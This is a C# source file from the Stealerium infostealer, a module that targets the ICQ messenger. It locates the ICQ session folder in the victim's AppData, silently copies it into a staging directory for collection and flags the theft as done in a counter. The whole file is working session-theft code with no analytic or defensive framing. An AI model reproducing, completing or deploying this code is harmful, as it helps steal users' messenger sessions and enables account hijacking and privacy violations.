using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Messengers;

internal sealed class Icq
{
	private static readonly string ICQPath = Path.Combine(Paths.Appdata, "ICQ");

	public static void GetSession(string sSavePath)
	{
		if (!Directory.Exists(ICQPath))
		{
			return;
		}
		string text = Path.Combine(ICQPath, "0001");
		if (Directory.Exists(text))
		{
			try
			{
				Filemanager.CopyDirectory(text, sSavePath + "\\0001");
			}
			catch
			{
				return;
			}
		}
		Counter.Icq = true;
	}
}
